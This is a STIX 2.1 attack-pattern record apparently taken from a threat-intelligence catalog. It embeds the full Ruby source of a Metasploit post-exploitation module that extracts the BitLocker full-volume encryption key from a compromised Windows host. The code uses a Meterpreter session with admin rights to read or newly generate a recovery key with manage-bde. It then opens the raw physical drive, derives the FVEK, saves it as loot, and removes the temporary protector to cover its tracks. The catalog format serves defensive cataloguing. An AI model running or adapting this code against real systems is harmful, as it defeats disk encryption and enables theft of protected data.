{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d5f6009f-c7e5-4bf9-9bd0-c59dfd794648",
    "created": "2024-08-14T16:33:05.041095Z",
    "modified": "2024-08-14T16:33:05.041099Z",
    "name": "Bitlocker Master Key (FVEK) Extraction",
    "description": " This module enumerates ways to decrypt Bitlocker volume and if a recovery key is stored locally or can be generated, dump the Bitlocker master key (FVEK)  'License' => 'MSF_LICENSE' 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/bitlocker_fvek.rb",
            "external_id": "bitlocker_fvek.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/libyal/libbde/blob/master/documentation/BitLockerDriveEncryption(BDE)format.asciidoc"
        },
        {
            "source_name": "reference",
            "url": "http://www.hsc.fr/ressources/outils/dislocker/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Error\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::File\n\n  ERROR = Msf::Post::Windows::Error\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Bitlocker Master Key (FVEK) Extraction',\n        'Description' => %q{\n          This module enumerates ways to decrypt Bitlocker volume and if a recovery key is stored locally\n          or can be generated, dump the Bitlocker master key (FVEK)\n        },\n        'License' => 'MSF_LICENSE',\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => ['Danil Bazin <danil.bazin[at]hsc.fr>'], # @danilbaz\n        'References' => [\n          ['URL', 'https://github.com/libyal/libbde/blob/master/documentation/BitLocker Drive Encryption (BDE) format.asciidoc'],\n          ['URL', 'http://www.hsc.fr/ressources/outils/dislocker/']\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('DRIVE_LETTER', [true, 'Dump informations from the DRIVE_LETTER encrypted with Bitlocker', nil]),\n        OptString.new('RECOVERY_KEY', [false, 'Use the recovery key provided to decrypt the Bitlocker master key (FVEK)', nil])\n      ]\n    )\n  end\n\n  def run\n    file_path = session.sys.config.getenv('windir') << '\\\\system32\\\\win32k.sys'\n    major, minor, _build, _revision, _branch = file_version(file_path)\n    winver = (major.to_s + '.' + minor.to_s).to_f\n\n    fail_with(Failure::NoTarget, 'Module not valid for OS older that Windows 7') if winver <= 6\n    fail_with(Failure::NoAccess, 'You don\\'t have administrative privileges') unless is_admin?\n\n    drive_letter = datastore['DRIVE_LETTER']\n    system_root = expand_path('%SYSTEMROOT%')\n\n    cmd_out = cmd_exec('wmic', \"logicaldisk #{drive_letter}: ASSOC:list /assocclass:Win32_LogicalDiskToPartition\")\n\n    @starting_offset = cmd_out.match(/StartingOffset=(\\d+)/)[1].to_i\n\n    drive_number = cmd_out.match(/DiskIndex=(\\d+)/)[1]\n\n    r = client.railgun.kernel32.CreateFileW(\"\\\\\\\\.\\\\PhysicalDrive#{drive_number}\",\n                                            'GENERIC_READ',\n                                            'FILE_SHARE_DELETE|FILE_SHARE_READ|FILE_SHARE_WRITE',\n                                            nil,\n                                            'OPEN_EXISTING',\n                                            'FILE_FLAG_WRITE_THROUGH',\n                                            0)\n\n    if r['GetLastError'] != ERROR::SUCCESS\n      fail_with(Failure::Unknown,\n                \"Error opening #{drive_letter}. Windows Error Code: #{r['GetLastError']}\n         - #{r['ErrorMessage']}\")\n    end\n\n    @handle = r['return']\n    print_good(\"Successfully opened Disk #{drive_number}\")\n    seek(0)\n\n    if !datastore['RECOVERY_KEY'].nil?\n      print_status('Using provided recovery key')\n      recovery_key = datastore['RECOVERY_KEY']\n    else\n      print_status('Trying to gather a recovery key')\n\n      manage_bde = \"#{system_root}\\\\system32\\\\manage-bde.exe\"\n      unless exist?(manage_bde)\n        manage_bde = \"#{system_root}\\\\sysnative\\\\manage-bde.exe\"\n        unless exist?(manage_bde)\n          fail_with(Failure::Unknown, 'manage-bde.exe not found')\n        end\n      end\n\n      cmd_out = cmd_exec(manage_bde, \"-protectors -get #{drive_letter}:\")\n\n      recovery_key = cmd_out.match(/((\\d{6}-){7}\\d{6})/)\n\n      if !recovery_key.nil?\n        recovery_key = recovery_key[1]\n        print_good(\"Recovery key found : #{recovery_key}\")\n      else\n        print_status('No recovery key found, trying to generate a new recovery key')\n        cmd_out = cmd_exec(manage_bde,\n                           \"-protectors -add #{drive_letter}: -RecoveryPassword\")\n        recovery_key = cmd_out.match(/((\\d{6}-){7}\\d{6})/)\n        id_key_tmp = cmd_out.match(/(\\{[^}]+\\})/)\n        if !recovery_key.nil?\n          recovery_key = recovery_key[1]\n          id_key_tmp = id_key_tmp[1]\n          print_good(\"Recovery key generated successfully : #{recovery_key}\")\n        else\n          print_error('Recovery Key generation failed')\n          print_status('No recovery key can be used')\n          return\n        end\n      end\n    end\n\n    begin\n      @bytes_read = 0\n      fs = Rex::Parser::BITLOCKER.new(self)\n      print_status('The recovery key derivation usually take 20 seconds...')\n      fvek = fs.fvek_from_recovery_password_dislocker(recovery_key)\n      if !fvek.blank?\n        stored_path = store_loot('windows.file', 'application/octet-stream',\n                                 session, fvek)\n        print_good(\"Successfuly extract FVEK in #{stored_path}\")\n        print_good('This hard drive could later be decrypted using : dislocker -k <key_file> ...')\n      else\n        print_error('Failed to generate FVEK, wrong recovery key?')\n      end\n    ensure\n      unless id_key_tmp.nil?\n        print_status('Deleting temporary recovery key')\n        cmd_exec(manage_bde,\n                 \"-protectors -delete #{drive_letter}: -id #{id_key_tmp}\")\n      end\n      client.railgun.kernel32.CloseHandle(@handle)\n    end\n    print_status('Post Successful')\n  end\n\n  def read(size)\n    client.railgun.kernel32.ReadFile(@handle, size, size, 4, nil)['lpBuffer']\n  end\n\n  def seek(offset)\n    offset += @starting_offset\n    high_offset = offset >> 32\n    low_offset = offset & (2**33 - 1)\n    client.railgun.kernel32.SetFilePointer(@handle, low_offset, high_offset, 0)\n  end\nend\n"
}